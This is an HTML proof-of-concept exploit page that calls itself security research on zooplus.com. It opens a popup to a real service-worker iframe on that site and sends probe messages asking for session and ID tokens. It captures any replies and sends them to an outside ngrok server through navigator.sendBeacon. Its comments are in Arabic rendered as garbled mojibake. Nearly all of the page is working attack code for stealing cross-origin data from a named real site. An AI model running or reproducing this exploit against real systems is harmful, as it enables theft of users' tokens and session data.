<!DOCTYPE html>
<html>
<head>
    <title>Security Research: Zooplus Bridge Analysis</title>
</head>
<body style="background:#1a1a1a; color:#00ff00; font-family: 'Courier New', monospace; padding:20px;">
    <h2>[!] Research Status: <span id="status">Ready</span></h2>
    <button id="startAttack" style="padding:15px; background:#222; color:#00ff00; border:1px solid #00ff00; cursor:pointer;">
        TEST BRIDGE COMMUNICATION
    </button>
    <div id="logs" style="margin-top:20px; border:1px solid #333; padding:10px; background:#000; min-height: 200px; font-size: 12px;"></div>

    <script>
        const logs = document.getElementById('logs');
        const status = document.getElementById('status');
        
        function log(msg) {
            const time = new Date().toLocaleTimeString();
            logs.innerHTML += `[${time}] > ${msg}<br>`;
            console.log(msg);
        }

        document.getElementById('startAttack').onclick = function() {
            log("Phase 1: Initializing Cross-Domain Popup...");
            
            // Ø¥Ø¶Ø§ÙØ© 1p=1 Ù„Ø¶Ù…Ø§Ù† ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…Ø³Ø§Ø± Ø§Ù„Ø¨Ø±Ù…Ø¬ÙŠ Ø§Ù„Ø°ÙŠ ÙŠØ³Ù…Ø­ Ø¨Ø§Ù„ØªØ¨Ø§Ø¯Ù„
            const targetUrl = "https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=" 
                              + encodeURIComponent(window.location.origin) 
                              + "&1p=1";
            
            const popup = window.open(targetUrl, "zooplus_bridge", "width=500,height=500");

            status.innerText = "Monitoring Message Bus...";

            // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„ÙƒÙ„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù‚Ø§Ø¯Ù…Ø© Ù…Ù† Zooplus
            window.addEventListener("message", function(event) {
                if (event.origin.includes("zooplus.com")) {
                    log("ðŸ”“ CAPTURED DATA: " + JSON.stringify(event.data));
                    
                    // Ø¥Ø°Ø§ Ø§Ø­ØªÙˆØª Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¹Ù„Ù‰ Ø£ÙŠ Ù…Ø¹Ø±ÙØ§Øª Ø­Ø³Ø§Ø³Ø©
                    if (event.data.token || event.data.clientId || event.data.failureType) {
                        status.innerText = "VULNERABILITY CONFIRMED";
                        status.style.color = "yellow";
                        
                        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙˆØ±Ø§Ù‹ Ù„ØªÙˆØ«ÙŠÙ‚Ù‡Ø§ ÙÙŠ Ø§Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ø®Ø§Øµ Ø¨Ø§Ù„Ø¨Ø§Ø­Ø«
                        navigator.sendBeacon("https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/collect", JSON.stringify({
                            source: "Zooplus_Bridge_Leak",
                            payload: event.data
                        }));
                    }
                }
            }, false);

            // Phase 2: Ø¥Ø±Ø³Ø§Ù„ Ø³Ù„Ø³Ù„Ø© Ù…Ù† Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ø§Ø³ØªØ·Ù„Ø§Ø¹ Ù„ØªÙ†Ø´ÙŠØ· Ø§Ù„Ù€ Service Worker
            setTimeout(() => {
                log("Phase 2: Sending probe triggers to Service Worker...");
                
                const probes = [
                    { type: "GET_SESSION_INFO" },
                    { type: "AUTH-SUCCESS-EVENT-v1" },
                    { type: "GET_ID_TOKEN" },
                    "ping", // Ø¨Ø¹Ø¶ Ø§Ù„Ø¬Ø³ÙˆØ± ØªØ³ØªØ¬ÙŠØ¨ Ù„Ù„Ù†ØµÙˆØµ Ø§Ù„Ø¨Ø³ÙŠØ·Ø©
                    { action: "init" }
                ];

                probes.forEach(p => {
                    popup.postMessage(p, "https://stm.zooplus.com");
                });
                
                log("Probes sent. Waiting for background relay...");
            }, 5000); // Ù†Ù†ØªØ¸Ø± 5 Ø«ÙˆØ§Ù†ÙŠ Ù„Ø¶Ù…Ø§Ù† Ø£Ù† Ø§Ù„Ù€ SW Ù‚Ø¯ ØªÙ… ØªØ³Ø¬ÙŠÙ„Ù‡ (Register)
        };
    </script>
</body>
</html>
